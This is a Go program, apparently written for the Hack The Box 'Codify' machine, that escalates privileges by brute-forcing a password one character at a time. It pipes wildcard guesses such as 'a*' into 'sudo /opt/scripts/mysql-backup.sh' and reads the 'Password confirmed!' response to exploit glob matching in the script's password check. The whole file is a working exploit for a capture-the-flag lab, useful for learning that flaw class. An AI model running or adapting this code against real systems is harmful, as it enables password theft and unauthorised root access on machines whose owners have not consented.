package main

import (
	"fmt"
	"os/exec"
	"strings"
)

func main() {

	banniere := `
+-------------------------------------------+
*▄▖      ▗     ▗ ▌                          *
*▌▌▛▌█▌▛▌▜▘▛▌▀▌▜▘▛▌▛▌▛▌█▌▛▌█▌               *
*▛▌▙▌▙▖▌▌▐▖▙▌█▌▐▖▌▌▙▌▙▌▙▖▌▌▙▖               *
*  ▄▌      ▌         ▄▌                     *
*                                           *
Privilege escalation in Codify (htb machine)*
                 - Author : Agentpathogene] *
+-------------------------------------------+
                                             `

	fmt.Println(banniere)

	// on stoke en simple chaine de caractere les caracteres potentiels du passwrd
	caractere := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	motdepasstrouve := ""
	// Boucle infinie qui reexecute le scripte et teste la connexion
	for {
		lettretrouvee := false
		//on parcourt chaque caractere de l'alphabet
		for i := 0; i < len(caractere); i++ {
			//on recupere la lettre actuelle
			lettreavalider := string(caractere[i])
			//on fabrique notre tentative g* puis si ok ga*
			tentative := motdepasstrouve + lettreavalider + "*"
			cmd := exec.Command("sudo", "/opt/scripts/mysql-backup.sh")
			//on relance a chaque fois le scripte bash et on
			//lui envoi notre tentative
			//On prepare l execution du scripte bash

			//On cree un standard input vers le script
			//c est la ou on injecte a* etc
			stdinpout, err := cmd.StdinPipe()
			if err != nil {
				fmt.Println("[-] Erreur Stdinpout :", err)
				return
			}

			_, err = stdinpout.Write([]byte(tentative + "\n"))
			if err != nil {
				fmt.Println("[-] Erreur d'ecriture :", err)
				return
			}
			stdinpout.Close()

			//on lance et on capture tout l'ecran
			output, _ := cmd.CombinedOutput()

			//on cherche le message de validation dans la capture
			if strings.Contains(string(output), "Password confirmed!") {
				motdepasstrouve = motdepasstrouve + lettreavalider
				fmt.Println("[+]Caractere trouve ! mot de passe actuel :>", motdepasstrouve)
				lettretrouvee = true
				break //on arrete la boucle infinie et reprend a for

			}

		} //fin de la boucle de l'alphabet

		//si aucune lettre le mot de passe est vide
		if !lettretrouvee {
			fmt.Println("[+]Mot de passe final trouve,", motdepasstrouve)
			break
		}
	}

}
